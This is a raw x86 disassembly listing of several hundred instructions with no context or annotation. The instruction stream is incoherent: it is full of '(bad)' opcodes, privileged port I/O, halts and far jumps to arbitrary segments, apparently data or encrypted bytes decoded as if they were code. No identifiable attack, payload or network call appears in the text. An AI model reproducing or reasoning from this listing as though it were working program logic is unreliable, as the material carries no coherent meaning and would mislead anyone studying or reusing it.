  40530e:	lods   al,BYTE PTR ds:[esi]
  40530f:	test   BYTE PTR [eax-0x5b8bdbb5],0x5c
  405316:	xchg   esi,eax
  405317:	stos   BYTE PTR es:[edi],al
  405318:	test   DWORD PTR [edi+0x52eec84a],ebx
  40531e:	ss pusha 
  405320:	out    dx,eax
  405321:	ins    BYTE PTR es:[edi],dx
  405322:	dec    ecx
  405323:	cmp    eax,edx
  405325:	push   ss
  405326:	(bad)  
  405327:	and    al,0xe0
  405329:	cmp    ah,BYTE PTR [edi-0x5d9f9025]
  40532f:	aam    0xa1
  405331:	data16 sbb al,0xbf
  405334:	pop    ds
  405335:	inc    ecx
  405336:	and    bh,BYTE PTR [esi+ebp*1]
  405339:	or     DWORD PTR [ebx+0xfade51e],edx
  40533f:	clc    
  405340:	add    eax,0x3796eb87
  405345:	dec    DWORD PTR [edx+0x41]
  405348:	fisubr WORD PTR [ecx-0x40]
  40534b:	ror    BYTE PTR [esi+0x2e],0xb4
  40534f:	mov    edx,0xbf12bc7f
  405354:	sti    
  405355:	mov    cl,0x3c
  405357:	jmp    0x40531e
  405359:	push   esp
  40535a:	mov    ds:0xb229d056,al
  40535f:	or     dh,BYTE PTR [eax+esi*2-0x5a]
  405363:	sbb    eax,0xd950905b
  405368:	std    
  405369:	adc    ebx,DWORD PTR [ebx+0x2f]
  40536c:	je     0x405317
  40536e:	mov    eax,ds:0x353a1565
  405373:	xlat   BYTE PTR ds:[ebx]
  405374:	nop
  405375:	push   0x25ce0bca
  40537a:	push   ds
  40537b:	pushf  
  40537c:	nop
  40537d:	mov    dl,0xde
  40537f:	and    al,0xf8
  405381:	shr    BYTE PTR [edx],0x26
  405384:	daa    
  405385:	jl     0x4053dc
  405387:	jge    0x4053c9
  405389:	std    
  40538a:	push   edx
  40538b:	jbe    0x405390
  40538d:	out    dx,eax
  40538e:	push   0xfffffff6
  405390:	and    BYTE PTR [eax-0x96d42f6],bl
  405396:	retf   
  405397:	lea    edx,[edi+0xa75b698]
  40539d:	cmp    DWORD PTR [ebx-0x10],ebx
  4053a0:	mov    ds:0xac5b23c5,eax
  4053a5:	and    bl,0x8b
  4053a8:	repz imul esp,DWORD PTR [eax+0x5d],0xfa804a7e
  4053b0:	fldcw  WORD PTR [eax]
  4053b2:	stos   DWORD PTR es:[edi],eax
  4053b3:	not    DWORD PTR [edx]
  4053b5:	jecxz  0x4053b0
  4053b7:	dec    edx
  4053b8:	push   cs
  4053b9:	inc    ebx
  4053ba:	in     al,dx
  4053bb:	xchg   esi,eax
  4053bc:	loope  0x4053f6
  4053be:	aaa    
  4053bf:	add    al,0xc2
  4053c1:	push   0xfaac8100
  4053c6:	test   eax,0xceae377b
  4053cb:	cpuid  
  4053cd:	shl    edx,0xf9
  4053d0:	or     bl,0xb1
  4053d3:	sub    eax,0xbe51a949
  4053d8:	dec    esi
  4053d9:	fwait
  4053da:	sub    al,0x5b
  4053dc:	enter  0xac25,0xfb
  4053e0:	hlt    
  4053e1:	loop   0x4053be
  4053e3:	sahf   
  4053e4:	sar    BYTE PTR [ebp-0x7f],1
  4053e7:	mov    cl,0xc0
  4053e9:	cmp    al,al
  4053eb:	add    bl,BYTE PTR [ecx+0x74]
  4053ee:	and    DWORD PTR [edx-0xd],ebp
  4053f1:	ret    0xedc6
  4053f4:	xchg   BYTE PTR [ecx-0x28],cl
  4053f7:	test   al,0x3a
  4053f9:	sub    dh,BYTE PTR [ebp+ebp*8+0x4c]
  4053fd:	test   eax,0x35302b4
  405402:	lahf   
  405403:	pop    ss
  405404:	repz (bad) 
  405406:	jne    0x4053c1
  405408:	cmp    cl,BYTE PTR [ecx-0x7c]
  40540b:	cmp    cl,cl
  40540d:	fsubr  st,st(5)
  40540f:	shl    BYTE PTR [edx-0x59],1
  405412:	stc    
  405413:	arpl   WORD PTR [eax-0x2],sp
  405416:	mov    cl,0xfe
  405418:	(bad)  
  405419:	mov    DWORD PTR [ebx+0x5a],ebx
  40541c:	adc    DWORD PTR [eax-0x1fb6c07a],esi
  405422:	xor    eax,0x1535d8e3
  405427:	xchg   edi,eax
  405428:	xor    eax,DWORD PTR [esi-0x37]
  40542b:	cli    
  40542c:	cmp    BYTE PTR [edi],0x8f
  40542f:	lods   eax,DWORD PTR cs:[esi]
  405431:	sub    al,dh
  405433:	cli    
  405434:	pushf  
  405435:	ror    DWORD PTR [edi+0x53],0x1d
  405439:	mov    cl,0x37
  40543b:	or     DWORD PTR [ebp-0xf],0x437bfb16
  405442:	call   0xb0e8:0x57659710
  405449:	mov    ebx,DWORD PTR [edi-0x879bed0]
  40544f:	jno    0x40544b
  405451:	sbb    dh,BYTE PTR [edi+0x33a7a8c6]
  405457:	sbb    al,BYTE PTR [ecx]
  405459:	xor    dh,BYTE PTR fs:[ebx+0x42585fd8]
  405460:	stos   DWORD PTR es:[edi],eax
  405461:	sbb    BYTE PTR [edx-0x42],0x7c
  405465:	lods   eax,DWORD PTR ds:[esi]
  405466:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405467:	nop
  405468:	jnp    0x4054e6
  40546a:	(bad)  
  40546b:	dec    esp
  40546c:	dec    ebx
  40546d:	sbb    eax,0xe4d6066a
  405472:	xchg   esi,eax
  405473:	mov    DWORD PTR [esi-0x73239590],edx
  405479:	inc    edx
  40547a:	add    al,0x91
  40547c:	(bad)  
  40547d:	leave  
  40547e:	or     DWORD PTR [esi-0x6c3dfc30],esi
  405484:	ret    0x4b7c
  405487:	aaa    
  405488:	inc    ecx
  405489:	arpl   WORD PTR [edi+0x29b24e6a],di
  40548f:	ins    BYTE PTR es:[edi],dx
  405490:	adc    BYTE PTR [esi+0x3e8c65b5],al
  405496:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405497:	aas    
  405498:	call   DWORD PTR [ebx+0x11]
  40549b:	xor    cl,BYTE PTR [ebx-0x789ff68]
  4054a1:	iret   
  4054a2:	pop    ecx
  4054a3:	add    esi,DWORD PTR [edx]
  4054a5:	jle    0x4054b7
  4054a7:	bound  ebp,QWORD PTR [eax+0x1c]
  4054aa:	cmp    dh,BYTE PTR [esi+0x42d4c52d]
  4054b0:	aas    
  4054b1:	rcr    DWORD PTR [ebx],cl
  4054b3:	dec    esi
  4054b4:	into   
  4054b5:	inc    ebx
  4054b6:	inc    DWORD PTR [ebx+0x28e43cb5]
  4054bc:	cmp    DWORD PTR [esi],eax
  4054be:	loop   0x405497
  4054c0:	stos   DWORD PTR es:[edi],eax
  4054c1:	dec    ecx
  4054c2:	cli    
  4054c3:	icebp  
  4054c4:	jp     0x4054b8
  4054c6:	int    0xc0
  4054c8:	lods   al,BYTE PTR ds:[esi]
  4054c9:	scas   al,BYTE PTR es:[edi]
  4054ca:	fwait
  4054cb:	xor    ch,dl
  4054cd:	mov    si,si
  4054d0:	mov    edx,0x14656be0
  4054d5:	xchg   esp,eax
  4054d6:	jno    0x405461
  4054d8:	(bad)
  4054dc:	pop    esi
  4054dd:	and    al,0x4d
  4054df:	pop    ebx
  4054e0:	inc    esi
  4054e1:	dec    esi
  4054e2:	mov    cl,0x94
  4054e4:	jae    0x405482
  4054e6:	popa   
  4054e7:	xchg   edx,eax
  4054e8:	pop    ebx
  4054e9:	shl    BYTE PTR ds:[esi-0x35b106ca],cl
  4054f0:	out    dx,al
  4054f1:	enter  0x4ff,0x4c
  4054f5:	fdivr  st(0),st
  4054f7:	stos   BYTE PTR es:[edi],al
  4054f8:	ror    esi,cl
  4054fa:	cmp    DWORD PTR [edx-0x24],ecx
  4054fd:	mov    ah,0x0
  4054ff:	xchg   edx,eax
  405500:	in     al,0xd7
  405502:	sub    eax,0x5874f1da
  405507:	pop    ebp
  405508:	and    ebx,DWORD PTR [ecx-0x439352b0]
  40550e:	call   0xded309a3
  405513:	mov    ah,0x51
  405515:	pushf  
  405516:	adc    DWORD PTR [edi-0x36],edx
  405519:	jl     0x40550c
  40551b:	add    esp,DWORD PTR [edx+0x5ffa54ff]
  405521:	leave  
  405522:	or     eax,0x91b5816
  405527:	lods   eax,DWORD PTR ds:[esi]
  405528:	gs (bad) 
  40552b:	sbb    DWORD PTR [edx],ebp
  40552d:	mov    ebx,0xdc64b313
  405532:	ret    
  405533:	imul   ebx,DWORD PTR [edx-0x6f],0x7c07250
  40553a:	inc    esi
  40553b:	fadd   st(1),st
  40553d:	test   al,0xe7
  40553f:	inc    ebx
  405540:	cdq    
  405541:	dec    edx
  405542:	sbb    eax,0x3c68ace
  405547:	enter  0x83c2,0xa5
  40554b:	push   es
  40554c:	mov    bh,0xdc
  40554e:	or     edi,DWORD PTR [esi]
  405550:	nop
  405551:	mov    edi,0xc3446450
  405556:	(bad)  
  405558:	and    dh,bl
  40555a:	push   esp
  40555c:	mov    ecx,DWORD PTR [edx+0x3367721c]
  405562:	popa   
  405563:	out    0x5e,eax
  405565:	jno    0x405544
  405567:	add    edi,edx
  405569:	dec    esi
  40556a:	pop    esp
  40556b:	popf   
  40556c:	je     0x4055d3
  40556e:	cmc    
  40556f:	sub    ah,BYTE PTR ds:0x2528cfe6
  405575:	pop    fs
  405577:	xchg   ecx,eax
  405578:	and    eax,0x77abecd0
  40557d:	and    DWORD PTR [eax+ecx*1],ebp
  405580:	icebp  
  405581:	sbb    eax,0x11a744ab
  405586:	jmp    0xb1f8:0x47258794
  40558d:	dec    edx
  40558e:	cmp    dh,ah
  405590:	stos   BYTE PTR es:[edi],al
  405591:	(bad)  [ebp-0xd]
  405594:	aaa    
  405595:	test   ebx,edx
  405597:	pop    ebx
  405598:	arpl   WORD PTR [edx],di
  40559a:	mov    eax,0xf1f8b362
  40559f:	sbb    ebx,DWORD PTR [ecx-0x78]
  4055a2:	sbb    BYTE PTR [ebp-0x2c788656],bh
  4055a8:	fs aas 
  4055aa:	pconfig 
  4055ad:	lds    ecx,FWORD PTR [ebx+0x53a98a46]
  4055b3:	jle    0x4055ad
  4055b5:	test   al,0x4b
  4055b7:	(bad)  
  4055b8:	pop    esi
  4055b9:	jno    0x405637
  4055bb:	je     0x4055df
  4055bd:	sahf   
  4055be:	mov    edx,0x40219413
  4055c3:	ret    0x96de
  4055c6:	je     0x405637
  4055c8:	pop    ds
  4055c9:	mov    bh,0xe9
  4055cb:	dec    edx
  4055cc:	dec    edx
  4055cd:	(bad)
  4055d1:	ret    
  4055d2:	add    eax,0xfebdcd77
  4055d7:	fisub  DWORD PTR [ebx]
  4055d9:	leave  
  4055da:	inc    eax
  4055db:	cs gs jae 0x405622
  4055df:	mov    cl,0x30
  4055e1:	pop    edi
  4055e2:	outs   dx,BYTE PTR ds:[esi]
  4055e3:	ds jnp 0x405613
  4055e6:	adc    al,0xd3
  4055e8:	mov    ah,0xa3
  4055ea:	push   ebp
  4055eb:	stc    
  4055ec:	sub    al,0xba
  4055ee:	or     eax,0x85c543a1
  4055f3:	hlt    
  4055f4:	dec    ebp
  4055f5:	call   0xb9c5:0x7197e86a
  4055fc:	xchg   esp,eax
  4055fd:	icebp  
  4055fe:	sub    bl,BYTE PTR [edx]
  405600:	fidivr WORD PTR [ebx-0x24]
  405603:	jo     0x4055d7
  405605:	pop    ss
  405606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405607:	mov    ah,0x31
  405609:	adc    cl,BYTE PTR [ebx-0x2165b49]
  40560f:	sub    esp,DWORD PTR [edi+0x5c1fef90]
  405615:	shl    BYTE PTR [ebx+0x19],0xec
  405619:	lock loop 0x405638
  40561c:	(bad)  
  40561d:	pushf  
  40561e:	cmp    DWORD PTR [eax+ebx*1+0x28],eax
  405622:	sbb    edi,eax
  405624:	xchg   esp,eax
  405625:	call   0x824f9972
  40562a:	fisub  WORD PTR [edi-0x3d]
  40562d:	push   cs
  40562e:	mov    BYTE PTR ds:[ebx*4+0x1b293b9e],al
  405636:	inc    edx
  405637:	fcomi  st,st(4)
  405639:	icebp  
  40563a:	cdq    
  40563b:	xor    BYTE PTR [ebp+0x7ca528c3],cl
  405641:	dec    ebx
  405642:	mov    dh,0xd2
  405644:	imul   eax,DWORD PTR [eax-0x3cca86aa],0xbb722a9c
  40564e:	adc    edi,DWORD PTR [edi-0x7d]
  405651:	out    0xba,eax
  405653:	jne    0x405609
  405655:	mov    dh,0x2
  405657:	aam    0x92
  405659:	xchg   ebx,eax
  40565a:	mov    ds:0x3460a058,al
  40565f:	add    edx,DWORD PTR [ebp+0x17]
  405662:	rcr    DWORD PTR [ebx+eax*8],1
  405665:	adc    al,BYTE PTR [ebx]
  405667:	push   esp
  405668:	xchg   ebx,eax
  405669:	aad    0x3c
  40566b:	sahf   
  40566c:	(bad)  
  40566d:	gs cmp al,0xa5
  405670:	push   0xffffffbe
  405672:	sbb    al,0xd8
  405674:	ret    
  405675:	adc    al,al
  405677:	mov    ecx,0x281ac985
  40567c:	fsubr  QWORD PTR [ebx]
  40567e:	add    bl,dl
  405680:	push   eax
  405681:	jo     0x40569c
  405683:	or     BYTE PTR [ebp-0x47],cl
  405686:	add    DWORD PTR [eax+0x3952032d],edi
  40568c:	pop    edx
  40568d:	mov    ecx,0xb4802885
  405692:	clc    
  405693:	(bad)  
  405694:	cmp    ah,dl
  405696:	pop    edi
  405697:	pop    eax
  405698:	adc    cl,BYTE PTR [eax-0x4c55ba5]
  40569e:	rcl    DWORD PTR [eax],cl
  4056a0:	jmp    0xb4f7:0xc212dee0
  4056a7:	fs mov esi,0x256f1165
  4056ad:	imul   ebx,DWORD PTR [ebp+0x7c22314b],0x6b
  4056b4:	push   es
  4056b5:	dec    edi
  4056b6:	mov    ds:0x8c8c1355,eax
  4056bb:	lock adc BYTE PTR [esi],bh
  4056be:	outs   dx,DWORD PTR ds:[esi]
  4056bf:	sbb    BYTE PTR [edi+eax*2+0x5],0x44
  4056c4:	fidivr WORD PTR [edi+esi*2-0x40268a34]
  4056cb:	scas   eax,DWORD PTR es:[edi]
  4056cc:	out    0x6a,al
  4056ce:	les    ebp,FWORD PTR [edx-0x49]
  4056d1:	dec    eax
  4056d2:	jb     0x405736
  4056d4:	and    bl,BYTE PTR ds:0x9ce9d484
  4056da:	stos   BYTE PTR es:[edi],al
  4056db:	icebp  
  4056dc:	pop    ecx
  4056dd:	push   edx
  4056de:	stc    
  4056df:	mov    cl,0x51
  4056e1:	(bad)  
  4056e2:	mov    BYTE PTR [esi],al
  4056e4:	xchg   edi,eax
  4056e5:	inc    edx
  4056e6:	sbb    bl,BYTE PTR [ebx+edi*8]
  4056e9:	ret    0xfd21
  4056ec:	push   edi
  4056ed:	mov    ebp,0x85e5142d
  4056f2:	lods   eax,DWORD PTR ds:[esi]
  4056f3:	xchg   BYTE PTR [esi+0x16],cl
  4056f6:	or     BYTE PTR [eax+0x1b],al
  4056f9:	jge    0x40568f
  4056fb:	fild   WORD PTR [ebx]
  4056fd:	int3   
  4056fe:	ret    
  4056ff:	fidivr DWORD PTR [edx]
  405701:	shl    DWORD PTR [ebp-0x4f7900f6],cl
  405707:	(bad)  
  405708:	retf   
  405709:	cmp    bl,BYTE PTR [esi-0x70]
  40570c:	mov    ch,0x90
  40570e:	jmp    0x6e82:0x446ca4af
  405715:	rcr    BYTE PTR [eax],0x1a
  405718:	mov    al,0x66
  40571a:	adc    DWORD PTR [ebp+0x29e5f84a],esi
  405720:	dec    esp
  405721:	inc    edi
  405722:	call   0x79de:0x23f4590c
  405729:	repz pop esi
  40572b:	sar    DWORD PTR [ebp-0x59],0x55
  40572f:	xchg   ebx,eax
  405730:	(bad)  
  405731:	and    al,0xc3
  405733:	sub    eax,0xe3b71057
  405738:	mov    BYTE PTR [eax+0x17],dl
  40573b:	out    dx,al
  40573c:	outs   dx,BYTE PTR ds:[esi]
  40573d:	xchg   ebp,eax
  40573e:	inc    ebx
  40573f:	jnp    0x40571b
  405741:	fidivr WORD PTR [ebp+0x52]
  405744:	out    dx,eax
  405745:	sar    BYTE PTR [ebx+0x1f],0xaf
  405749:	adc    bl,BYTE PTR [edi+0x7ef84fa5]
  40574f:	or     eax,0x46f2b4ea
  405754:	cmp    BYTE PTR [ebx+0x54b40606],dh
  40575a:	or     ah,BYTE PTR [esi]
  40575c:	mov    dh,0x9e
  40575e:	test   BYTE PTR [edi-0xf],bl
  405761:	cmpxchg al,cl
  405764:	adc    eax,0xe93602c0
  405769:	cmp    al,0xd5
  40576b:	jmp    0xcc95:0x162ffe2d
  405772:	and    eax,0x98b78f6d
  405777:	pusha  
  405778:	gs fcomp QWORD PTR ss:[eax-0x366fada0]
  405780:	mov    edi,0xd3aa474c
  405785:	mov    edi,0xd3726a83
  40578a:	sub    al,0x9d
  40578c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40578d:	cli    
  40578e:	pop    esp
  40578f:	jge    0x405753
  405791:	loope  0x405726
  405793:	jne    0x4057f0
  405795:	sbb    BYTE PTR [ebx+0x58],cl
  405798:	stc    
  405799:	add    eax,0xb7c6aad6
  40579e:	sub    al,0xa8
  4057a0:	sub    BYTE PTR [esi],dl
  4057a2:	daa    
  4057a3:	imul   ecx,eax,0x51
  4057a6:	pop    esp
  4057a7:	mov    eax,ds:0x76c1c7c6
  4057ac:	pop    ebp
  4057ad:	jecxz  0x40578c
  4057af:	mov    ds:0xe5c20e9f,al
  4057b4:	add    BYTE PTR [esi],cl
  4057b6:	test   al,0x5b
  4057b8:	test   DWORD PTR [eax],edx
  4057ba:	inc    edi
  4057bb:	or     DWORD PTR [ebx-0x76c8506c],esp
  4057c1:	retf   0x1b7
  4057c4:	aam    0x54
  4057c6:	stos   BYTE PTR es:[edi],al
  4057c7:	ret    
  4057c8:	mov    esp,0xdb78762
  4057cd:	xlat   BYTE PTR ds:[ebx]
  4057ce:	js     0x3e16c998
  4057d4:	and    BYTE PTR [esi+0x3e94d466],bh
  4057da:	popf   
  4057db:	add    DWORD PTR [ebx+0x7b5428f8],0xffffff88
  4057e2:	outs   dx,DWORD PTR ds:[esi]
  4057e3:	lea    eax,[ebp+0x2e]
  4057e6:	xor    DWORD PTR [eax-0x3539a841],esi
  4057ec:	inc    esp
  4057ed:	aaa    
  4057ee:	imul   ebx,esp,0xffffff8f
  4057f1:	outs   dx,BYTE PTR ds:[esi]
  4057f2:	sub    BYTE PTR [ecx],dl
  4057f4:	test   DWORD PTR [esi-0x76],0xff09db0
  4057fb:	dec    ecx
  4057fc:	mov    bl,0x7
  4057fe:	or     eax,0x1f11a9ec
  405803:	inc    dh
  405805:	jb     0x4057bc
  405807:	jmp    0x4057bb
  405809:	ins    BYTE PTR es:[edi],dx
  40580a:	das    
  40580b:	shr    BYTE PTR [edi],cl
  40580d:	loopne 0x4057d0
  40580f:	addr16 aaa 
  405811:	pop    ss
  405812:	add    BYTE PTR [edx],ah
  405814:	scas   eax,DWORD PTR es:[edi]
  405815:	mov    bh,0xfe
  405817:	data16 and BYTE PTR fs:[edx],bh
  40581b:	and    eax,0x831675f
  405820:	leave  
  405821:	out    0xbe,eax
  405823:	and    eax,0xf55eead6
  405828:	lods   eax,DWORD PTR ds:[esi]
  405829:	add    esi,DWORD PTR [edx]
  40582b:	(bad)  
  40582d:	xchg   ebx,eax
  40582e:	xchg   ebp,eax
  40582f:	stos   BYTE PTR es:[edi],al
  405830:	add    eax,DWORD PTR [eax+ebp*4-0x3df0e055]
  405837:	jmp    0x4057b9
  405839:	inc    eax
  40583a:	sub    eax,0x5adb2bd5
  40583f:	jbe    0x4057ed
  405841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405842:	je     0x405814
  405844:	inc    ebx
  405845:	xchg   esi,eax
  405846:	pop    ebx
  405847:	jge    0x405826
  405849:	xchg   ebx,eax
  40584a:	fidivr WORD PTR [edx+0x2b892edb]
  405850:	std    
  405851:	jae    0x4057fd
  405853:	imul   ebp,DWORD PTR [ebx+esi*4],0x607814a0
  40585a:	cld    
  40585b:	mov    eax,0xb3551852
  405860:	mov    bl,0x56
  405862:	lahf   
  405863:	test   DWORD PTR [ecx],esi
  405865:	cdq    
  405866:	lahf   
  405867:	out    dx,al
  405868:	js     0x40585a
  40586a:	mov    edx,0x46a809f1
  40586f:	and    eax,0xaee80528
  405874:	xor    ecx,esi
  405876:	sar    ebx,0x7a
  405879:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40587a:	cdq    
  40587b:	ja     0x405810
  40587d:	das    
  40587e:	dec    ebp
  40587f:	xchg   edi,eax
  405880:	repz adc al,0x22
  405883:	cwde   
  405884:	push   edx
  405885:	adc    DWORD PTR [ecx-0x3f48b3f9],ebx
  40588b:	mov    bh,0xf0
  40588d:	dec    edi
  40588e:	push   ss
  40588f:	ins    BYTE PTR es:[edi],dx
  405890:	stos   BYTE PTR es:[edi],al
  405891:	icebp  
  405892:	les    edi,FWORD PTR [esi+0x40]
  405895:	jle    0x4058c3
  405897:	nop
  405898:	rcl    ebx,0x47
  40589b:	push   edx
  40589c:	shr    esp,1
  40589e:	xor    DWORD PTR [edi-0x53],esi
  4058a1:	mov    ecx,0x698cf692
  4058a6:	and    dh,BYTE PTR [edi-0x68af3f]
  4058ac:	sbb    ah,bl
  4058ae:	loope  0x405910
  4058b0:	add    edx,esp
  4058b2:	stos   BYTE PTR es:[edi],al
  4058b3:	(bad)  
  4058b5:	enter  0xb0ff,0x13
  4058b9:	cdq    
  4058ba:	sub    al,0xec
  4058bc:	cwde   
  4058bd:	imul   DWORD PTR [ebx]
  4058bf:	bswap  esi
  4058c1:	sar    BYTE PTR [ebp+0x53],0x21
  4058c5:	ins    BYTE PTR es:[edi],dx
  4058c6:	std    
  4058c7:	mov    eax,0xea4f74bf
  4058cc:	ret    
  4058cd:	iret   
  4058ce:	lds    ecx,FWORD PTR [edx+eax*4-0x7ca4643f]
  4058d5:	aam    0xb5
  4058d7:	xchg   esi,eax
  4058d8:	mov    ebx,DWORD PTR [edi-0x66]
  4058db:	int3   
  4058dc:	xchg   esp,eax
  4058dd:	dec    esi
  4058de:	jo     0x405894
  4058e0:	shr    BYTE PTR [edi-0x6a1dbea8],1
  4058e6:	sbb    dh,BYTE PTR [ecx-0x40e46781]
  4058ec:	sbb    dl,BYTE PTR ds:0x28e58bc0
  4058f2:	psubb  mm2,QWORD PTR ss:[eax+0x5d54d547]
  4058fa:	push   0x7c73f447
  4058ff:	or     BYTE PTR [ebx],dh
  405901:	cmp    BYTE PTR [ebp+ebx*1+0x2c04f24f],dl
  405908:	mov    edx,0x259b8eed
  40590d:	and    eax,0xb55dad08
  405912:	das    
  405913:	push   ds
  405914:	mov    eax,esp
  405916:	jae    0x405989
  405918:	sub    bl,0x4c
  40591b:	test   eax,0xf8e4a030
  405920:	mov    dh,BYTE PTR [ebx]
  405922:	xor    bl,BYTE PTR [ecx+0x20]
  405925:	fbstp  TBYTE PTR ds:0x8a2318a4
  40592b:	xchg   DWORD PTR [edi+0x1e],esp
  40592e:	lea    ebp,ds:0x160eba47
  405934:	bound  eax,QWORD PTR [eax+0x50f2c76d]
  40593a:	(bad)  
  40593c:	jae    0x4058cd
  40593e:	mov    edi,0x80cadc62
  405943:	mov    ds:0x7e1950a1,al
  405948:	xchg   edx,eax
  405949:	in     eax,dx
  40594a:	(bad)  
  40594b:	aad    0xf5
  40594d:	jnp    0x4058f2
  40594f:	inc    esi
  405950:	jno    0x4059c4
  405952:	jbe    0x405903
  405954:	sbb    DWORD PTR [eax],0x76
  405957:	pushf  
  405958:	ins    BYTE PTR es:[edi],dx
  405959:	aam    0x59
  40595b:	add    bl,BYTE PTR [ebp-0x5e87554e]
  405961:	mov    ebp,DWORD PTR [edx+0x60399dc]
  405967:	sbb    al,0xbd
  405969:	pop    es
  40596a:	dec    esi
  40596b:	sbb    eax,0xae04c1e
  405970:	dec    esp
  405971:	pop    eax
  405972:	xchg   ebx,eax
  405973:	jno    0x40599e
  405975:	mov    eax,0x2930d89c
  40597a:	(bad)  
  40597b:	jmp    0x405927
  40597d:	or     eax,0xf59d22f1
  405982:	sub    bh,0xf0
  405985:	loopne 0x40595d
  405987:	or     al,0x6c
  405989:	mov    ah,0x68
  40598b:	popf   
  40598c:	jge    0x40591f
  40598e:	adc    al,0x55
  405990:	sbb    al,0xb6
  405992:	mov    esp,0x53d6d364
  405997:	mov    ebp,0x5055b2f0
  40599c:	int    0xdf
  40599e:	neg    BYTE PTR es:[edi-0x754a10f3]
  4059a5:	push   esp
  4059a6:	loope  0x405a0e
  4059a8:	mov    esi,0xcd457904
  4059ad:	sbb    BYTE PTR [ecx-0x3e],cl
  4059b0:	gs inc ecx
  4059b2:	fisttp QWORD PTR [ecx-0x598f990c]
  4059b8:	test   al,0x1a
  4059ba:	jae    0x405953
  4059bc:	xchg   ecx,eax
  4059bd:	leave  
  4059be:	jg     0x405a37
  4059c0:	popa   
  4059c1:	stos   BYTE PTR es:[edi],al
  4059c2:	mov    ch,0x78
  4059c4:	call   0x1bc27b28
  4059c9:	inc    ebp
  4059ca:	iret   
  4059cb:	inc    ebp
  4059cc:	adc    esi,DWORD PTR [edi-0x3a]
  4059cf:	dec    ebp
  4059d0:	cld    
  4059d1:	pop    ds
  4059d2:	mov    bl,0x69
  4059d4:	push   edx
  4059d5:	adc    ecx,DWORD PTR [edi-0x537f180b]
  4059db:	add    al,0x30
  4059dd:	test   DWORD PTR [edi],edx
  4059df:	ds inc edx
  4059e1:	dec    ebx
  4059e2:	or     esi,DWORD PTR [edx-0x47]
  4059e5:	test   eax,0xc3c2b2bd
  4059ea:	jb     0x405a02
  4059ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059ed:	fldcw  WORD PTR [ecx+0x2b]
  4059f0:	gs and ebp,eax
  4059f3:	sub    DWORD PTR [edx+0x25],0xd198b81b
  4059fa:	retf   0xcc09
  4059fd:	mov    edx,0x34035468
  405a02:	(bad)  [esi+0x2e9f759b]
  405a08:	push   0x9ce08760
  405a0d:	lahf   
  405a0e:	pop    esi
  405a0f:	pop    ebp
  405a10:	push   ss
  405a11:	push   edi
  405a12:	sbb    al,0xe8
  405a14:	sbb    BYTE PTR [ebp-0x5aac79ed],cl
  405a1a:	lods   eax,DWORD PTR ds:[esi]
  405a1b:	les    ebx,FWORD PTR [ebx-0x501da225]
  405a21:	addr16 (bad) 
  405a23:	nop
  405a24:	rcr    BYTE PTR [ebp-0x9df2b5],1
  405a2a:	mov    ebx,0xe601b325
  405a2f:	push   ebp
  405a30:	mov    ecx,0x92f0b843
  405a35:	test   DWORD PTR [edx+0x2ab4b8dd],ecx
  405a3b:	mov    dl,BYTE PTR [edx]
  405a3d:	jmp    0xcc40:0xc4abf076
  405a44:	adc    eax,0x215fe7ab
  405a49:	test   DWORD PTR [ebp+0x45],esi
  405a4c:	dec    ebx
  405a4d:	pop    ss
  405a4e:	add    BYTE PTR [ebp+ebx*1+0x57602aa9],cl
  405a55:	mov    edx,cs
  405a57:	outs   dx,BYTE PTR ds:[esi]
  405a58:	pop    esp
  405a59:	leave  
  405a5a:	mov    bh,BYTE PTR [edi]
  405a5c:	add    eax,0x61a1a339
  405a61:	into   
  405a62:	inc    ebx
  405a63:	mov    ds:0xa84eb8d5,al
  405a68:	cmp    eax,0xf288af75
  405a6d:	dec    ecx
  405a6e:	cdq    
  405a6f:	adc    al,0x37
  405a71:	outs   dx,DWORD PTR ds:[esi]
  405a72:	sbb    BYTE PTR [edi],al
  405a74:	sub    eax,0xb38d1dd8
  405a79:	(bad)  
  405a7a:	nop
  405a7b:	xor    DWORD PTR [edx],ecx
  405a7d:	mov    ebp,0x4176d86c
  405a82:	es inc ecx
  405a84:	and    eax,0x9a304526
  405a89:	push   ss
  405a8a:	fbld   TBYTE PTR [ebp+esi*8+0x6d]
  405a8e:	push   cs
  405a8f:	cmp    ch,BYTE PTR [esi*8-0x33c7e58a]
  405a96:	or     eax,DWORD PTR [ebp+0x1c]
  405a99:	mov    ah,0xd
  405a9b:	repz mov edx,0xd0d05b4d
  405aa1:	mov    BYTE PTR [esp+edx*4-0x1b],ah
  405aa5:	(bad)  
  405aa6:	ds ret 
  405aa8:	lds    ecx,FWORD PTR [eax]
  405aaa:	pop    ebx
  405aab:	xchg   ebx,eax
  405aac:	inc    esi
  405aad:	aad    0xf0
  405aaf:	popa   
  405ab0:	dec    ecx
  405ab1:	cld    
  405ab2:	out    0x21,eax
  405ab4:	rcl    DWORD PTR [ebp+0x5f],1
  405ab7:	jno    0x405a8e
  405ab9:	and    dh,BYTE PTR [esi+0x57]
  405abc:	dec    ebx
  405abd:	or     BYTE PTR [ebp+esi*2-0x79],0x6f
  405ac2:	mov    ebx,0x867de567
  405ac7:	mov    ah,0xd3
  405ac9:	cmp    DWORD PTR [ecx+0x45],esp
  405acc:	test   al,0xc9
  405ace:	std    
  405acf:	fstp   DWORD PTR [esi+0x6a]
  405ad2:	mov    ecx,0xaa1b9208
  405ad7:	rcr    DWORD PTR [esi+0x1e],0xee
  405adb:	ins    DWORD PTR es:[edi],dx
  405adc:	mov    ch,0xcf
  405ade:	lods   eax,DWORD PTR ds:[esi]
  405adf:	pop    ds
  405ae0:	add    edx,edx
  405ae2:	mov    edx,DWORD PTR [ebx]
  405ae4:	mov    ebp,0x4b000a3f
  405ae9:	push   cs
  405aea:	jmp    0x405ad7
  405aec:	lea    ecx,[ebp+0x21]
  405aef:	js     0x405aed
  405af1:	cdq    
  405af2:	fwait
  405af3:	push   ds
  405af4:	lahf   
  405af5:	inc    ebp
  405af6:	dec    ecx
  405af7:	mov    ch,0xea
  405af9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405afa:	retf   0x32cf
  405afd:	dec    edi
  405afe:	ja     0x405ac8
  405b00:	adc    ebx,DWORD PTR [ecx]
  405b02:	cmc    
  405b03:	dec    ecx
  405b04:	fiadd  WORD PTR ds:0x74eb3112
